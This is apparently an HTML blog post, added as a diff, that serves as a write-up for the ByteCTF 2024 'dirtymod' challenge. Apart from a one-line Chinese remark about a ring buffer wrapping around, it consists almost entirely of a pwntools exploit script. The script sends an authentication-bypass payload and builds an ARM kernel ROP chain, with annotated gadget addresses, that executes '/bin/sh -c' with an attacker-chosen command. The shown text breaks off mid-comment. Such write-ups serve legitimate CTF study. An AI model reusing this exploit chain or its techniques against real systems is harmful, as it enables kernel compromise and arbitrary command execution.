@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>bytectf 2024 dirtymod</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./bytectf 2024 dirtymod.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">bytectf 2024 dirtymod</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2026-02-09]</div>
+    </header>
+    <div class="layout-grid">
+                <main><p>环形结构 回绕造成问题</p>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import</span><span style="color:#d08770;">*
+</span><span style="color:#c0c5ce;">context.log_level=&quot;</span><span style="color:#a3be8c;">debug</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">ip = &quot;</span><span style="color:#a3be8c;">127.0.0.1</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">port = </span><span style="color:#d08770;">2325
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># ip = &quot;113.201.14.253&quot;
+</span><span style="color:#65737e;"># port = 35812
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_bypass_payload</span><span style="color:#c0c5ce;">():
+</span><span style="color:#c0c5ce;">    payload = bytearray()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">i == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">            offset = </span><span style="color:#d08770;">248  </span><span style="color:#65737e;"># 0xF8
+</span><span style="color:#c0c5ce;">            value = </span><span style="color:#d08770;">1  </span><span style="color:#65737e;"># 要写入 buf[504] 的值
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">            offset = </span><span style="color:#d08770;">0  </span><span style="color:#65737e;"># 在允许范围内的偏移
+</span><span style="color:#c0c5ce;">            value = </span><span style="color:#d08770;">0  </span><span style="color:#65737e;"># 任意值
+</span><span style="color:#c0c5ce;">        payload += struct.</span><span style="color:#8fa1b3;">pack</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">BB</span><span style="color:#c0c5ce;">&quot;, offset, value)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">payload
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">auth</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">r</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">please input 0 or 1</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x01</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#8fa1b3;">create_bypass_payload</span><span style="color:#c0c5ce;">())
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">opt</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">context</span><span style="color:#c0c5ce;">=&#39;&#39;):
+</span><span style="color:#c0c5ce;">    r=</span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(ip,port)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">auth</span><span style="color:#c0c5ce;">(r)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">server or client ?</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x01</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] hello server</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(opt)
+</span><span style="color:#c0c5ce;">    data = &#39;&#39;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">opt==&#39;</span><span style="color:#96b5b4;">\x30</span><span style="color:#c0c5ce;">&#39;:
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] create puredata</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">p16</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">))
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(context)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">opt==&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;:
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] say hello</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">p16</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">))
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(context)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">opt ==&#39;</span><span style="color:#96b5b4;">\x20</span><span style="color:#c0c5ce;">&#39;:
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] do opt func</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">p16</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">))
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(context)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">opt ==&#39;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&#39;:
+</span><span style="color:#c0c5ce;">        r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">p16</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">))
+</span><span style="color:#c0c5ce;">        data = r.</span><span style="color:#8fa1b3;">recv</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">data
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">_client</span><span style="color:#c0c5ce;">():
+</span><span style="color:#c0c5ce;">    r=</span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(ip,port)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">auth</span><span style="color:#c0c5ce;">(r)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">server or client ?</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] hello client</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recv</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    data=r.</span><span style="color:#8fa1b3;">recv</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">data
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">_client_20</span><span style="color:#c0c5ce;">():
+</span><span style="color:#c0c5ce;">    r=</span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(ip,port)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">auth</span><span style="color:#c0c5ce;">(r)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">server or client ?</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] hello client</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x20</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">payload</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">payload[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">:idx]+str+payload[idx+</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(str):]
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">_rop</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">heap</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x2000
+</span><span style="color:#c0c5ce;">    stack=</span><span style="color:#d08770;">0x1000
+</span><span style="color:#c0c5ce;">    save_sp=</span><span style="color:#d08770;">0x1500
+</span><span style="color:#c0c5ce;">    agr=</span><span style="color:#d08770;">0x1700
+</span><span style="color:#c0c5ce;">    sl=</span><span style="color:#d08770;">0x1800
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;,agr)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">-c</span><span style="color:#c0c5ce;">&quot;,agr+</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,cmd,agr+</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap+agr),agr+</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap+agr+</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">),agr+</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap+agr+</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">),agr+</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190
+</span><span style="color:#65737e;">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c
+</span><span style="color:#65737e;">    0x8051ef98:	cmp	r2, #0
+</span><span style="color:#65737e;">    0x8051ef9c:	beq	0x8051efb0
+</span><span style="color:#65737e;">    0x8051efa0:	blx	r2
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap),</span><span style="color:#d08770;">0x190</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">#r3
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x8049dd4c</span><span style="color:#c0c5ce;">),</span><span style="color:#d08770;">0x7c</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">#r2
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]
+</span><span style="color:#65737e;">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]
+</span><span style="color:#65737e;">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]
+</span><span style="color:#65737e;">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]
+</span><span style="color:#65737e;">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x802d4d18</span><span style="color:#c0c5ce;">),</span><span style="color:#d08770;">0xec</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">#r2
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap),</span><span style="color:#d08770;">0xe4</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">#r1
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x80694958</span><span style="color:#c0c5ce;">),</span><span style="color:#d08770;">0x4</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">#r3
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x80694958</span><span style="color:#c0c5ce;">),</span><span style="color:#d08770;">0xf0</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">#r0
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp
+</span><span style="color:#65737e;">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]
+</span><span style="color:#65737e;">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0
+</span><span style="color:#65737e;">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]
+</span><span style="color:#65737e;">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]
+</span><span style="color:#65737e;">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap),</span><span style="color:#d08770;">0x3c</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">#r3
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap+stack),</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;"># r2
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x8010c03c</span><span style="color:#c0c5ce;">),</span><span style="color:#d08770;">0xc</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">#r3
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2
+</span><span style="color:#65737e;">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    {r4, r5, r6, r7, r8, sb, sl, fp, pc}
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(save_sp+heap),stack)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x8017c0f0</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]
+</span><span style="color:#65737e;">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    {r4, pc}
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x804282e4</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x804282e4                                pop    {r1, r2, r3}
+</span><span style="color:#65737e;">    0x804282e8                                sub    r0, r0, r1
+</span><span style="color:#65737e;">    0x804282ec                                rsb    r0, r0, r2
+</span><span style="color:#65737e;">    0x804282f0                                pop    {r4, pc}
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x804282e4</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">13</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x8010c020</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    {r0, pc}
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x80136dec</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">17</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x80136dec &lt;module_attr_show+32&gt;          pop    {lr}
+</span><span style="color:#65737e;">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x804282e4                          pop    {r1, r2, r3}
+</span><span style="color:#65737e;">    0x804282e8                          sub    r0, r0, r1
+</span><span style="color:#65737e;">    0x804282ec                          rsb    r0, r0, r2
+</span><span style="color:#65737e;">    0x804282f0                          pop    {r4, pc}
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x8010c040</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">19</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap+save_sp-</span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">22</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x8022b754</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">23</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x8022b754 &lt;dio_complete+120&gt;    ldr    ip, [r4, #0x24]
+</span><span style="color:#65737e;">    0x8022b758 &lt;dio_complete+124&gt;    stm    sp, {r7, ip}
+</span><span style="color:#65737e;">    0x8022b75c &lt;dio_complete+128&gt;    blx    r1 
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
